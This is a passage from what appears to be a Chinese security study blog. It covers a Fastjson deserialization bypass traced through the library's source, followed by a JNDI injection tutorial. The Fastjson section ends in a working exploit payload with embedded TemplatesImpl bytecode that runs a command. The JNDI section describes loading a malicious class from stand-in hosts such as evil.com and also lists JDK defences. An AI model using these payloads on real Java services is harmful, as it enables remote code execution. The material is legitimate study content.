loadClass(String className, ClassLoader classLoader)</code> 添加了cache参数为true</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/a8e289c4baf848209d49e4df20a658aa.png\" alt=\"image-20220402141939266\"></p>\n<p>搜一下两个参数的loadClass在何处调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/b9f0f32bbe7f63b91682a6caaaebe89c.png\" alt=\"image-20220402142223547\"></p>\n<p>这里就关注<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> 摘取部分代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> &lt;T&gt; <span class=\"function\">T <span class=\"title\">deserialze</span><span class=\"params\">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class=\"line\">        JSONLexer lexer = parser.lexer;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//4. clazz类型等于InetSocketAddress.class的处理。</span></span><br><span class=\"line\">        <span class=\"comment\">//我们需要的clazz必须为Class.class，不进入</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        Object objVal;</span><br><span class=\"line\">        <span class=\"comment\">//3. 下面这段赋值objVal这个值</span></span><br><span class=\"line\">        <span class=\"comment\">//此处这个大的if对于parser.resolveStatus这个值进行了判断，我们在稍后进行分析这个是啥意思</span></span><br><span class=\"line\">    \t<span class=\"comment\">//当parser.resolveStatus的值为  TypeNameRedirect</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class=\"line\">            parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class=\"line\">            parser.accept(JSONToken.COMMA);</span><br><span class=\"line\">            <span class=\"comment\">//lexer为json串的下一处解析点的相关数据</span></span><br><span class=\"line\">             <span class=\"comment\">//如果下一处的类型为string</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//判断解析的下一处的值是否为val，如果不是val，报错退出</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!<span class=\"string\">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"comment\">//移动lexer到下一个解析点</span></span><br><span class=\"line\">                <span class=\"comment\">//举例：&quot;val&quot;:(移动到此处-&gt;)&quot;xxx&quot;</span></span><br><span class=\"line\">                lexer.nextToken();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            parser.accept(JSONToken.COLON);</span><br><span class=\"line\">            <span class=\"comment\">//此处获取下一个解析点的值&quot;xxx&quot;赋值到objVal</span></span><br><span class=\"line\">            objVal = parser.parse();</span><br><span class=\"line\"></span><br><span class=\"line\">            parser.accept(JSONToken.RBRACE);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//当parser.resolveStatus的值不为TypeNameRedirect</span></span><br><span class=\"line\">            <span class=\"comment\">//直接解析下一个解析点到objVal</span></span><br><span class=\"line\">            objVal = parser.parse();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        String strVal;</span><br><span class=\"line\">        <span class=\"comment\">//2. 可以看到strVal是由objVal赋值，继续往上看</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (objVal == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            strVal = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (objVal <span class=\"keyword\">instanceof</span> String) &#123;</span><br><span class=\"line\">            strVal = (String) objVal;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//不必进入的分支</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strVal == <span class=\"keyword\">null</span> || strVal.length() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//省略诸多对于clazz类型判定的不同分支</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//1. 可以得知，我们的clazz必须为Class.class类型</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz == Class.class) &#123;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">//strVal是我们想要可控的一个关键的值，我们需要它是一个恶意类名</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>整个逻辑大概就是 <strong>strVal-&gt;objVal-&gt;parser.parse()</strong> 也就是说json的格式为</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"string\">&quot;@type&quot;</span>:<span class=\"string\">&quot;java.lang.Class&quot;</span>,<span class=\"string\">&quot;val&quot;</span>:<span class=\"string\">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"流程跟进\"><a href=\"#流程跟进\" class=\"headerlink\" title=\"流程跟进\"></a>流程跟进</h2><p><code>JSON.parseObject()</code> 调用 <code>DefaultJSONParser</code> 对 JSON 进行解析。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/71f8cd27e992f94d7e32a5ce0ba6a5a1.png\" alt=\"image-20220402151126900\"></p>\n<p>进入checkAutoType 进行加载类合法性，由于 deserializers 在初始化时将 <code>Class.class</code> 进行了加载，因此使用 findClass 可以找到，越过了后面 AutoTypeSupport 的检查。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/5124b698c8e940e69a671bc89b3992b9.png\" alt=\"image-20220402151540867\"></p>\n<p>回到 <code>DefaultJSONParser.parseObject()</code> 设置 resolveStatus 为 TypeNameRedirect</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/7bfd08a6607d10352d59ef4cc84022c9.png\" alt=\"image-20220402151629919\"></p>\n<p><code>DefaultJSONParser.parseObject()</code> 根据不同的 class 类型分配 deserialzer，Class 类型由 <code>MiscCodec.deserialze()</code> 处理。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/e34e1bcad9f85e8b1da12ea86cff4468.png\" alt=\"image-20220402151749269\"></p>\n<p>因为上面的this.set操作，进入if</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/7c0fc2ad407aaa1704048de315849230.png\" alt=\"image-20220402160626758\"></p>\n<p>成功解析赋值给objVal</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/e12e7a19812aafbb091bd92a783bbcf4.png\" alt=\"image-20220402151944191\"></p>\n<p>继续赋值给strVal</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/833e9f0be216cec05b9551b06846bdcc.png\" alt=\"image-20220402152040380\"></p>\n<p>成功走到loadClass，在这里进行了缓存，写入到mappings</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/9326d161e6b0b81d9453c1ccb5e83ec1.png\" alt=\"image-20220402152141252\"></p>\n<p>进入 设置cache为True</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/72086a5c2bb0d591a19db8290b9a6a4e.png\" alt=\"image-20220402152237851\"></p>\n<p>写入缓存mappings中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/7dacbb4aa9196cbebc66d8e0d2c167cd.png\" alt=\"image-20220402153536134\"></p>\n<p>一路返回，接下来轮到恶意类了，进入checkAutoType 检查</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/a7d029f1d8d1377c2ad41b94a9f158d8.png\" alt=\"image-20220402161241901\"></p>\n<p>直接功获取到恶意类</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/57841b9b7f7d82d1b3f4b2c741e77978.png\" alt=\"image-20220402161335497\"></p>\n<p>然后就是发序列化触发了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/92169a5d400996d1244d32c584d03ff1.png\" alt=\"image-20220402161504439\"></p>\n<p>exp</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"string\">&quot;a&quot;</span>:&#123;<span class=\"string\">&quot;@type&quot;</span>: <span class=\"string\">&quot;java.lang.Class&quot;</span>,<span class=\"string\">&quot;val&quot;</span>: <span class=\"string\">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>&#125;, </span><br><span class=\"line\"><span class=\"string\">&quot;b&quot;</span>:&#123;<span class=\"string\">&quot;@type&quot;</span>: <span class=\"string\">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class=\"string\">&quot;_bytecodes&quot;</span>: [<span class=\"string\">&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAKcG9jXzEuamF2YQwACAAJBwAhDAAiACMBAARjYWxjDAAkACUBAAVwb2NfMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAJAAQACgANAAsADAAAAAQAAQANAAEADgAPAAEACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAOAAEADgAQAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEQAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAATAAgAFAAMAAAABAABABQAAQAVAAAAAgAW&quot;</span>],<span class=\"string\">&#x27;_name&#x27;</span>:<span class=\"string\">&#x27;c.c&#x27;</span>,<span class=\"string\">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class=\"string\">&quot;_outputProperties&quot;</span>:&#123;&#125;,<span class=\"string\">&quot;_name&quot;</span>:<span class=\"string\">&quot;a&quot;</span>,<span class=\"string\">&quot;_version&quot;</span>:<span class=\"string\">&quot;1.0&quot;</span>,<span class=\"string\">&quot;allowedProtocols&quot;</span>:<span class=\"string\">&quot;all&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://xz.aliyun.com/t/7027#toc-20\">JAVA反序列化—FastJson组件 - 先知社区 (aliyun.com)</a></p>\n<p><a href=\"https://javasec.org/java-vuls/FastJson.html#8-fastjson-1268\">Fastjson 反序列化漏洞 · 攻击Java Web应用</a></p>\n","categories":["JavaSec"]},{"title":"JNDI注入","url":"/2023/12/25/JNDI-attack/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/feng.jpeg\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>JNDI注入! 环境版本：<strong>JDK1.8.0-66</strong></p>\n<h1 id=\"JNDI概念\"><a href=\"#JNDI概念\" class=\"headerlink\" title=\"JNDI概念\"></a>JNDI概念</h1><p>JNDI 全称为 <strong>Java Naming and Directory Interface(Java 命名与目录接口)</strong> 是SUN公司提供的一种标准的 <strong>Java命名系统接口</strong>，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p>\n<p>那么我们就知道了它为java提供的一个<strong>接口</strong>，而且分为了两个部分，命名服务与目录服务。</p>\n<h2 id=\"Naming-Service-命名服务\"><a href=\"#Naming-Service-命名服务\" class=\"headerlink\" title=\"Naming Service 命名服务\"></a>Naming Service 命名服务</h2><p>命名服务也可称为名称服务将名称和对象进行关联，提供 <strong>通过名称找到对象</strong> 的操作，但是存在一些特殊情况，在一些命名服务系统中并不直接将对象进行存储，而是存储了对象的引用，引用包含了如何访问实际对象的信息，类似于指针。</p>\n<p>命名服务普遍存在于计算机系统中，例如:</p>\n<ul>\n<li>DNS: 通过域名查找实际的 IP 地址</li>\n<li>文件系统: 通过文件名定位到具体的文件</li>\n</ul>\n<p>在命名系统中，存在以下几个重要的概念：</p>\n<ul>\n<li><strong>Bindings</strong>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP。</li>\n<li><strong>Context</strong>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (subcontext)。</li>\n<li><strong>References</strong>: 当存在上述的特殊情况时，以引用的形式进行存储，可以理解为指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd ，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li>\n</ul>\n<h2 id=\"Directory-Service-目录服务\"><a href=\"#Directory-Service-目录服务\" class=\"headerlink\" title=\"Directory Service 目录服务\"></a>Directory Service 目录服务</h2><p>目录服务是名称服务的 <strong>一种拓展</strong>，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性(attributes)信息。由此，我们不仅可以根据名称去查找(<strong>lookup</strong>)对象(并获取其对应属性)，还可以根据属性值去搜索(<strong>search</strong>)对象。</p>\n<p>即：名称 -&gt; 对象 与 对象的属性 -&gt; 对象</p>\n<h2 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h2><p>根据上面的介绍，我们知道 <strong>目录服务是中心化网络应用的一个重要组件</strong>。使用目录服务可以简化应用中服务管理验证逻辑，集中存储共享信息。目录服务的存在拓宽了我们获取一个对象的方式，不仅仅通过lookup，还能通过search。</p>\n<blockquote>\n<p> 比如对于打印机服务，我们可以通过在目录服务中查找打印机，并获得一个打印机对象，基于这个 Java 对象进行实际的打印操作。</p>\n</blockquote>\n<p>基于以上情况就有了 JNDI，应用通过该接口与具体的目录服务进行交互。从设计上，JNDI 独立于具体的目录服务实现，设计出了应用范围宽泛的(也就是兼容性比较强大)，因此可以针对不同的目录服务提供统一的操作接口。</p>\n<p>JNDI 架构上主要包含两个部分，即 Java 的应用层接口和 <strong>SPI</strong>，如下图所示:</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220706004532839.png\" alt=\"image-20220706004532839\"></p>\n<p><strong>SPI</strong></p>\n<p>SPI 全称为 Service Provider Interface，即服务供应接口，主要作用是<strong>为底层的具体的目录服务提供统一接口</strong>，从而实现目录服务的可插拔式安装。在 JDK 中包含了下述内置的目录服务:</p>\n<ul>\n<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>\n<li>LDAP: 轻量级目录访问协议</li>\n<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务</li>\n</ul>\n<h1 id=\"JNDI的结构\"><a href=\"#JNDI的结构\" class=\"headerlink\" title=\"JNDI的结构\"></a>JNDI的结构</h1><p>从上面介绍的三个 Service Provider 我们可以看到，除了 RMI 是 Java 特有的远程调用框架，其他两个都是通用的服务和标准，可以脱离 Java 独立使用。JNDI 就是在这个基础上提供了统一的接口，来方便调用各种服务。在 Java JDK 里面提供了5个包，提供给JNDI的功能实现，分别是：</p>\n<ul>\n<li>javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。</li>\n<li>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</li>\n<li>javax.naming.event：在命名目录服务器中请求事件通知；</li>\n<li>javax.naming.ldap：提供LDAP支持；</li>\n<li>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</li>\n</ul>\n<p>其中最为重要的是 javax.naming，其中的一些类需要学习一下</p>\n<h2 id=\"InitialContext类\"><a href=\"#InitialContext类\" class=\"headerlink\" title=\"InitialContext类\"></a>InitialContext类</h2><p>构造方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;构建一个初始上下文。</span><br><span class=\"line\">InitialContext() </span><br><span class=\"line\">&#x2F;&#x2F;构造一个初始上下文，并选择不初始化它。</span><br><span class=\"line\">InitialContext(boolean lazy) </span><br><span class=\"line\">&#x2F;&#x2F;使用提供的环境构建初始上下文。</span><br><span class=\"line\">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br></pre></td></tr></table></figure>\n\n<p>常用方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;将名称绑定到对象。 </span><br><span class=\"line\">bind(Name name, Object obj) </span><br><span class=\"line\">&#x2F;&#x2F;枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class=\"line\">list(String name) </span><br><span class=\"line\">&#x2F;&#x2F;检索命名对象。</span><br><span class=\"line\">lookup(String name)  </span><br><span class=\"line\">&#x2F;&#x2F;将名称绑定到对象，覆盖任何现有绑定。</span><br><span class=\"line\">rebind(String name, Object obj) </span><br><span class=\"line\">&#x2F;&#x2F;取消绑定命名对象。</span><br><span class=\"line\">unbind(String name)  </span><br></pre></td></tr></table></figure>\n\n<p>示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.InitialContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.NamingException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jndi</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> NamingException </span>&#123;</span><br><span class=\"line\">        String uri = <span class=\"string\">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">//在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</span></span><br><span class=\"line\">        InitialContext initialContext = <span class=\"keyword\">new</span> InitialContext();</span><br><span class=\"line\">        initialContext.lookup(uri);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Reference类\"><a href=\"#Reference类\" class=\"headerlink\" title=\"Reference类\"></a>Reference类</h2><p>该类也是在 javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的 <strong>引用功能</strong>。</p>\n<p>构造方法:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;为类名为“className”的对象构造一个新的引用。</span><br><span class=\"line\">Reference(String className) </span><br><span class=\"line\">&#x2F;&#x2F;为类名为“className”的对象和地址构造一个新引用。 </span><br><span class=\"line\">Reference(String className, RefAddr addr) </span><br><span class=\"line\">&#x2F;&#x2F;为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span><br><span class=\"line\">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br><span class=\"line\">Reference(String className, String factory, String factoryLocation)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*</span><br><span class=\"line\">参数：</span><br><span class=\"line\">className 远程加载时所使用的类名</span><br><span class=\"line\">factory  加载的class中需要实例化类的名称</span><br><span class=\"line\">factoryLocation  提供classes数据的地址可以是file&#x2F;ftp&#x2F;http协议</span><br><span class=\"line\">*&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>常用方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;将地址添加到索引posn的地址列表中。</span><br><span class=\"line\">void add(int posn, RefAddr addr) </span><br><span class=\"line\">&#x2F;&#x2F;将地址添加到地址列表的末尾。 </span><br><span class=\"line\">void add(RefAddr addr) </span><br><span class=\"line\">&#x2F;&#x2F;从此引用中删除所有地址。  </span><br><span class=\"line\">void clear() </span><br><span class=\"line\">&#x2F;&#x2F;检索索引posn上的地址。 </span><br><span class=\"line\">RefAddr get(int posn) </span><br><span class=\"line\">&#x2F;&#x2F;检索地址类型为“addrType”的第一个地址。  </span><br><span class=\"line\">RefAddr get(String addrType) </span><br><span class=\"line\">&#x2F;&#x2F;检索本参考文献中地址的列举。 </span><br><span class=\"line\">Enumeration&lt;RefAddr&gt; getAll() </span><br><span class=\"line\">&#x2F;&#x2F;检索引用引用的对象的类名。 </span><br><span class=\"line\">String getClassName() </span><br><span class=\"line\">&#x2F;&#x2F;检索此引用引用的对象的工厂位置。  </span><br><span class=\"line\">String getFactoryClassLocation() </span><br><span class=\"line\">&#x2F;&#x2F;检索此引用引用对象的工厂的类名。  </span><br><span class=\"line\">String getFactoryClassName() </span><br><span class=\"line\">&#x2F;&#x2F;从地址列表中删除索引posn上的地址。    </span><br><span class=\"line\">Object remove(int posn) </span><br><span class=\"line\">&#x2F;&#x2F;检索此引用中的地址数。 </span><br><span class=\"line\">int size() </span><br><span class=\"line\">&#x2F;&#x2F;生成此引用的字符串表示形式。</span><br><span class=\"line\">String toString() </span><br></pre></td></tr></table></figure>\n\n<p>示例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.NamingException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Reference;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.AlreadyBoundException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jndi</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> NamingException, RemoteException, AlreadyBoundException </span>&#123;</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;http://127.0.0.1:8080&quot;</span>; </span><br><span class=\"line\">        Registry registry = LocateRegistry.createRegistry(<span class=\"number\">1099</span>);</span><br><span class=\"line\">        Reference reference = <span class=\"keyword\">new</span> Reference(<span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;test&quot;</span>, url);</span><br><span class=\"line\">        ReferenceWrapper referenceWrapper = <span class=\"keyword\">new</span> ReferenceWrapper(reference);</span><br><span class=\"line\">        registry.bind(<span class=\"string\">&quot;aa&quot;</span>,referenceWrapper);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里调用了ReferenceWrapper进行对引用的包装，提一句原因。</p>\n<blockquote>\n<p>查看到Reference,并没有实现Remote接口也没有继承 UnicastRemoteObject类，前面讲RMI的时候说过，将类注册到Registry需要实现Remote和继承UnicastRemoteObject类。这里并没有看到相关的代码，所以这里还需要调用ReferenceWrapper将他给封装一下。</p>\n</blockquote>\n<h1 id=\"JNDI-References-注入\"><a href=\"#JNDI-References-注入\" class=\"headerlink\" title=\"JNDI References 注入\"></a>JNDI References 注入</h1><p>在JNDI中对象的传递为两种，一、序列化，二、引用。针对于引用的方式，<strong>如果我们可控客户端的 lookup()内容，控制客户端去访问恶意的服务中心(比如rmi和ldap)，获取到恶意的引用，从而获取恶意远程服务器的恶意class文件进行执行。</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714154410955.png\" alt=\"image-20220714154410955\"></p>\n<ol>\n<li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <strong>rmi://evil.com:1099/refObj</strong></li>\n<li>原先配置好的上下文环境 会因为动态环境转换而被指向  <strong>rmi://evil.com:1099/</strong></li>\n<li>应用去 <strong>rmi://evil.com:1099</strong> 请求绑定对象 refObj，攻击者事先准备好的 RMI 服务会返回与名称 refObj 绑定的ReferenceWrapper 对象</li>\n<li>应用获取到 ReferenceWrapper 对象开始从本地 <strong>CLASSPATH</strong> 中搜索 EvilObject 类，如果不存在则会从恶意远程服务器上去尝试获取 <strong>EvilObject.class</strong>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code></li>\n<li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <strong>EvilObject.class</strong></li>\n<li>应用开始调用 <strong>EvilObject</strong> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行</li>\n</ol>\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><ul>\n<li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly 默认值被设置为 true。将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>\n<li>JDK 6u141、7u131、8u121之后：增加了 com.sun.jndi.rmi.object.trustURLCodebase 选项，默认为 false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>\n<li>JDK 6u211、7u201、8u191之后：增加了 com.sun.jndi.ldap.object.trustURLCodebase 选项，默认为 false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>\n</ul>\n<p>这就涉及到高版本下的JNDI绕过，下篇学习。</p>\n<h1 id=\"JNDI-RMI\"><a href=\"#JNDI-RMI\" class=\"headerlink\" title=\"JNDI-RMI\"></a>JNDI-RMI</h1><h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><p>Server端</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> 